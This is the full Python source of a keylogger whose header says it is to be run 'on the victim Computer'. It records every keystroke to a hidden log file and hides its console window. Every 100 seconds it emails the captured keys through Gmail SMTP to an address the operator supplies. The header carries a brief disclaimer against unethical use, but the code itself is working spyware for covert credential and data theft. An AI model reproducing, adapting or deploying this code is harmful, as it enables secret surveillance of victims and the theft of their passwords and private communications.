# =======================================================================================
# Name        : Python Keylogger
# Author      : Zaid Siddiqui
# Version     : 1.0
# Copyright   : (c) Reserved
# Description : A simple Python Keylogger that has to be executed on the victim Computer
# Usage       : This Keylogger MUST NOT be used for any unethical activity. The author
#               will not be responsible in any case of this being used unethically.
# WARNING:  :   This keylogger will be detected by windows. To understand how to run this
#               Keylogger. Read the 'README.md' file
# =======================================================================================

# Required Libraries
from pynput import keyboard
import smtplib, ssl
import time
import ctypes
import os

global start_time

interval = 60
smtp_server = "smtp.gmail.com"
port = 587
sender_email = ""       # Place your email here
reciever_email = ""     # Place the email that will recieve the captured keys
password = ""           # Place the password of the sender email here
characters = ""

context = ssl.create_default_context()

class KeyLogger():
    def __init__(self, filename: str = "logs.txt"):
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char, 0
        except AttributeError:
            return str(key), 1

    def mail(self):
        f = open("logs.txt")
        characs = f.read()
        #print(characs)
        f.close()
        f = open("logs.txt", "r+")
        f.truncate(0)
        f.close()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.starttls(context=context)
            server.login(sender_email, password)
            server.sendmail(sender_email, reciever_email, characs)
        except Exception as e:
            print(e)
        finally:
            server.quit()

    def on_press(self, key):
        global start_time

        #print(key)
        with open(self.filename, 'a') as logs:
            os.system("attrib +h "+self.filename)

            a, b = self.get_char(key)

            if b == 0:
                logs.write(a)
            else:
                logs.write("\n"+a+"\n")

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()

if __name__ == '__main__':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    start_time = time.time()
    logger = KeyLogger()
    logger.main()
    #time.sleep(50000)
    tt = 0
    #print("here")
    while True:
        tt += 100
        time.sleep(100)     # Replace 100 with the time limit after which you want to recieve emails.
        logger.mail()
